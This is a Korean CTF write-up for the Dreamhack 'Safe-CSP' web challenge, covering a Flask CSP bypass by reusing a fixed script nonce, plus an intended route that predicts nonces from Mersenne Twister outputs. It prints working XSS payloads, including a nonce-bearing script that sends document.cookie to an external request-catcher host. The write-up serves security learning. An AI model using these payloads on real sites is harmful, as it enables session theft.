# Challenge: dreamhack - Safe-CSP

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/2196


## 추가학습
### Flask/Jinja2의 safe 필터
* {{ memo_text | safe }} 와 같이 사용하여 Jinja2 템플릿 엔진에게 이 문자열은 안전하니 HTML escape하지말라고 알려주는 필터이다.
* 특수문자를 변환하지 않으니 원본 HTML이 유지되어 <script>, <img> 등이 그대로 출력되는 상황이 생긴다.



## 문제 풀이
* app.py의 CSP코드 부터 보자.
    ```
    @app.after_request
    def add_header(response):
        global NONCE
        response.headers[
            "Content-Security-Policy"
        ] = f"default-src 'self';base-uri 'none';style-src 'none';img-src *;script-src 'nonce-{NONCE}'"
        return response
    ```
    * default-src 'self' : 같은 도메인 리소스를 허용
    * base-uri 'none' : 모든 base 태그를 차단한다. 즉, base 태그를 통해 URL 조작 방지
    * style-src 'none' : 모든 스타일링 차단한다.
    * img-src * : 모든 이미지 소스를 허용한다.
    * script-src 'nonce-{NONCE}" : 인라인에 대해 nonce가 필요하다.

* 우선 주어진 user, pass로 로그인을 하면 관리자 계정이 아니어서 차단된다. 개발자도구에서 username의 value를 admin으로 바꿔주면 관리자 계정으로 접근할 수 있다.
* flag를 얻기 위해서는 /debug로 요청을 보내야 한다. 따라서 페이로드를 다음과 같이 작성해보자. 툴즈로 발급받은 외부 주소로 get 요청이 잘 오는 것을 알 수 있다.
    ```
    debug?param=<img src="https://xcxwwug.request.dreamhack.games/1?param=4">
    ```
* script 실행을 위해 nonce 값을 알아야하는데, logout 전까지 Nonce의 값이 바뀌지 않는 것을 알 수 있다. 해당 nonce 값을 찾아 script 태그를 사용해주면 된다. 아래는 내가 보낸 http request이다.
    ```
    GET /debug?param=<script nonce=AAAAAA3mRlI=>location.href="https://otxvzgp.request.dreamhack.games?param="%2Bdocument.cookie</script> HTTP/1.1
    ```

* 참고로 다음 페이로드는 적용이 안된다. CSP는 onerror, onclick 과 같은 인라인 이벤트 핸들러를 스크립트로 간주하여 차단하기 때문이다.
    ```
    debug?param=<img src="" onerror="location.href='https://xcxwwug.request.dreamhack.games/1 param=4'">
    ```

## 결과
외부 서버 주소의 request를 보면 param=username=admin;%20flag=DH{~~~~로 잘 나오는 것을 알 수 있다.


## 인텐 풀이
* 위와 같이 풀었으나 언인텐이었던 것 같다. 전반적인 흐름은 유사하지만 nonce가 고정된 값이라는 사실을 이용하는 것이 아니라 nonce를 생성하는 함수에 대한 취약점을 이용하는 방식이었다.
* 즉, NONCE = base64.b64encode(random.getrandbits(32).to_bytes(8, 'big')).decode()로 정의한 방식에 대한 취약점이었다.

* /memo 코드를 보자.
    ```
    @app.route('/memo')
def memo():
    username = request.cookies.get('username')
    memo_text = request.args.get('text', '')
    
    if not username or username not in USER_DATA:
        return redirect('/login')

    if username != 'admin':
        return 'You are not admin!!!'

    try:
        r = random.getrandbits(32)
        memo_bytes = memo_text.encode('utf-8')
        memo_int = bytes_to_long(memo_bytes)
        xor_result = memo_int ^ r
        xor_hex = hex(xor_result)
    except Exception as e:
        xor_hex = f"Conversion fail: {e}"

    resp = make_response(render_template("memo.html", username=username, memo_text=memo_text, xor_result=xor_hex))
    return resp
    ```
    * 사용자가 /memo?text= 으로 보낸 memo_text를 10진수로 변환하고 난수 r과 XOR한다. 서버가 랜덤 r을 출력하지는 않지만 memo_text 값을 알기 때문에 xor의 특징을 이용해 r을 역산해낼 수 있다.
    * python의 random 모듈은 Mersenne Twister PRNG를 사용하는데 Mersenne Twister는 내부 상태가 624개의 32비트 값이다. 따라서 624개의 연속된 출력값을 얻는다면 앞으로 나올 난수나 이전 난수까지도 예측이 가능하다. 즉, /memo에 624번 요청하면 624개의 r을 얻고 그 뒤 nonce 생성에 쓰이는 난수까지도 계산 가능하다는 것이다.


    